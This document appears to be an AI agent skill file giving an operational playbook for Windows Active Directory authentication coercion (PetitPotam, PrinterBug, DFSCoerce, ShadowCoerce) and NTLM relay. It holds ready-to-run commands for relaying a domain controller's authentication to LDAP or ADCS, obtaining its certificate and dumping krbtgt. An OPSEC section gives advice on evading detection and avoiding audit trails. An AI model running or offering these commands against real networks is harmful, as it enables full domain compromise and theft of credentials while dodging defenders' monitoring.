---
name: ad-coercer
description: "Authentication coercion against Windows / AD — PetitPotam (MS-EFSR), PrinterBug (MS-RPRN), DFSCoerce (MS-DFSNM), ShadowCoerce (MS-FSRVP), Coercer.py meta-tool. Force a Windows machine to NTLM-authenticate to attacker, then relay or crack offline."
allowed-tools: Bash Read Write
metadata:
  when_to_use: "petitpotam printerbug dfscoerce shadowcoerce coercer msefsr msrprn msdfsnm msfsrvp authentication coercion ntlm relay"
  subdomain: ad
  tags: ad, coercion, ntlm-relay, petitpotam
  mitre_attack: T1187, T1557.001
---

# Authentication Coercion (PetitPotam family)

Force a Windows machine — usually a Domain Controller — to send an NTLM authentication to an attacker-controlled host. Then either relay the auth (via `ntlmrelayx`) or crack it offline.

## The family of coercion vulnerabilities

| Vector | Protocol | RPC | Mitigated by |
|---|---|---|---|
| **PetitPotam** | MS-EFSR (Encrypting File System Remote) | `EfsRpcOpenFileRaw` | KB5005413 (Aug 2021) — partial; bypasses persist via other Efs* methods |
| **PrinterBug** | MS-RPRN (Print System Remote) | `RpcRemoteFindFirstPrinterChangeNotificationEx` | Disable Print Spooler |
| **DFSCoerce** | MS-DFSNM (Distributed File System) | `NetrDfsGetVersion`, `NetrDfsRemoveStdRoot` | Restrict DFSN to admins |
| **ShadowCoerce** | MS-FSRVP (File Server Remote VSS) | `IsPathSupported` | KB5015527 (Jul 2022) |
| **CheeseOunce / WebDavCoerce** | WebDAV WebClient | (various) | Disable WebClient service |

All four boil down to: an unauthenticated/low-priv RPC call that triggers the target to authenticate outbound.

## Workflow

### 1. Set up the listener (attacker)

```bash
# Option A: ntlmrelayx (relay auth to a useful service)
sudo impacket-ntlmrelayx -t ldap://dc.target.local --escalate-user lowpriv -smb2support
# OR relay to ADCS for cert-based domain admin:
sudo impacket-ntlmrelayx -t http://ca.target.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Option B: just capture the hash
sudo impacket-ntlmrelayx -t ldap://dc.target.local --no-smb-server
# OR with responder
sudo responder -I eth0
```

### 2. Coerce auth from a target machine

```bash
# Coercer — meta-tool, tries every vector
git clone https://github.com/p0dalirius/Coercer
sudo python3 Coercer.py coerce -l <attacker_ip> -t <target_ip> -u 'low_priv_user' -p 'pass'
# or anonymous (often works pre-PetitPotam patch):
sudo python3 Coercer.py coerce -l <attacker_ip> -t <target_ip> -u '' -p ''

# Or individual scripts:
python3 PetitPotam.py <attacker_ip> <target_ip>
python3 dfscoerce.py -u lowpriv -p pass <attacker_ip> <target_ip>
python3 printerbug.py target.local/user:pass@<target_ip> <attacker_ip>
```

### 3. Catch the auth → escalate

```
[ntlmrelayx] SMBD-Thread-X: Received connection from <target_ip>, attacking target ldap://dc.target.local
[ntlmrelayx] Authenticating against ldap://dc.target.local as TARGET\DC$ SUCCEED
[ntlmrelayx] Adding lowpriv to Domain Admins group: SUCCEED
```

If you relayed to ADCS:
```
[ntlmrelayx] GOT CERTIFICATE! ID 1234
[ntlmrelayx] Base64 certificate of user DC$: MII...
```
Then use that cert with `certipy auth -pfx dc.pfx -username 'dc$' -domain target.local`.

## Why coerce DC$? — The privilege escalation chain

The DC's machine account (`DC$`) has `Replicating Directory Changes` permission. With its NTLM hash or TGT, you DCSync and own the domain:

```bash
# After getting DC$ cert from ADCS relay:
certipy auth -pfx dc.pfx -username 'dc$' -domain target.local
# Returns TGT
impacket-secretsdump -k -no-pass target.local/dc$@dc.target.local
# Dumps krbtgt — full domain compromise
```

## Targets that work

- Any unpatched DC (most environments still have PetitPotam variants)
- Any server with Print Spooler running (PrinterBug)
- Any Windows server with DFS Namespace (often DCs + file servers)
- ADCS Web Enrollment endpoint (relay to it for cert-based DA)

## OPSEC

- Coercion attempts log `EFSRPC_*` / `RPRN_*` event sources on the target — usually low-priority but visible in dedicated AD-attack detection (MDI, Defender for Identity).
- Inbound NTLM authentication from a DC to a non-domain workstation is a strong signal — relay to a host that legitimately receives auth (a file server, a printer-ish hostname).
- Use a coercion vector that DOESN'T require credentials (PetitPotam unauthenticated path, ShadowCoerce) if possible — leaves no user-level audit trace.

## References

- topotam77's PetitPotam — github.com/topotam/PetitPotam
- p0dalirius's Coercer — github.com/p0dalirius/Coercer
- dirkjanm's "Relaying NTLM auth" series
- SpecterOps "Coercing AD auth" cheat sheet
- ADCS abuse: SpecterOps "Certified Pre-Owned" whitepaper
